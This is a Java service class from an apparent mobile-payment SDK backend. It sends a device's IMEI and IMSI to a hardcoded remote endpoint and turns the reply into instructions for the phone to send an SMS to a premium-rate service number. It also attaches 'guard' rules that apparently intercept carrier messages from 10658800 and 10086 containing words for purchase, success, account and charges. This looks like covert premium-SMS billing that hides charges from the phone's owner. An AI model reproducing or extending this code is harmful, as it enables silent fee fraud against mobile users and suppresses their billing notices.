package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Error;
import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Repeat;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.jxt.pay.appclient.utils.XmlUtils;

/**

http://124.172.237.77/MMSQLWMessage/getqlmocontent?appid=XXX&imei=XXXXX&imsi=XXXXX&paycode=XXXXX&cpid=&chid=请求参数说明

2. 数据返回格式（格式一）
XXXXXX
返回数据如果成功的话*后为指令内容（BASE64加密），渠道自己判断是否取到指令，如请求出错，需要重新在发送请求获取内容。
合作方请按此规范开发HTTP接口（GET方式）
2. 数据返回格式（格式2）
106X*XXXXXX
返回数据如果成功的话分为二部分*后为指令内容，如果收到结果不为二部分，说明请求出错，需要重新在发送请求获取内容。
合作方请按此规范开发HTTP接口（GET方式）

 * @author leoliu
 *
 */
public class BjjsSmm1DynamicService implements IDynamicService{
	private static Logger logger = Logger.getLogger(BjjsSmm1DynamicService.class);
	
	private static final String TYPE = "bjjsSmm1";
	
	private static final String URLPARAM = "appid={appid}&imei={imei}&imsi={imsi}&paycode={paycode}&cpid={cpid}&chid={chid}";
	
	private int timeOut = 60;
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();

	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String orderId = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(orderId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(orderId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(orderId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String appid = StringUtils.defaultString(map.get("appid"));
			String paycode = StringUtils.defaultString(map.get("paycode"));
			String chid = StringUtils.defaultString(map.get("chid"));
			String cpid = StringUtils.defaultString(map.get("cpid"));
			
			String param = URLPARAM.replace("{imsi}", imsi).replace("{imei}", imei).replace("{appid}", appid).replace("{paycode}", paycode).replace("{chid}", chid).replace("{cpid}", cpid);
			
			String responseTxt = GetData.getData(url+"?"+param);
	
			xml = parseXml(map,responseTxt);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(orderId);
			}else{
				xml = DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	private String parseXml(Map<String, String> map,String xml){
		
		logger.info("xml:"+xml);
		
		if(xml != null && xml.length() > 0 && xml.startsWith("106")){
			String dest = "";
			String msg = "";
			
			{
				String[] arr = xml.split("\\*");
				dest = arr[0];
				msg = arr[1];
			}
			
			
			Sms sms = new Sms();
			
			sms.setSmsContent(msg);
			sms.setSmsDest(dest);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
		
			Sms guardSms = new Sms();
						
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
					
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			
			return XstreamHelper.toXml(sms).toString()+XstreamHelper.toXml(guardSms).toString();
		}

		return null;
	}
	
	
	public static void main(String[] args){
		
		test2();
		
//		System.out.println(fetchSid("MM#WLAN#KjGDL0HmLvO27awoEZxqQw==#1022273555#399900003000"));
	}
	
	private static void test2(){
//		http://124.172.237.77/MMSQLWMessage/getqlmocontent?appid=3038489&imei=862949029214504&imsi=460022101441340&paycode=30000873430704&cpid=36&chid=3003954714
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://124.172.237.77/MMSQLWMessage/getqlmocontent");
		map.put("imei","862949029214514");
		map.put("imsi","460022101441350");
		map.put("channel", "10B201a087654321");
		map.put("appid","3038489");
		map.put("paycode","30000873430704");
		map.put("cpid","36");
		map.put("chid", "3003954714");
		map.put("type","bjjsSmm1");
		
		System.out.println(new BjjsSmm1DynamicService().dynamic(map));
	}
	
}
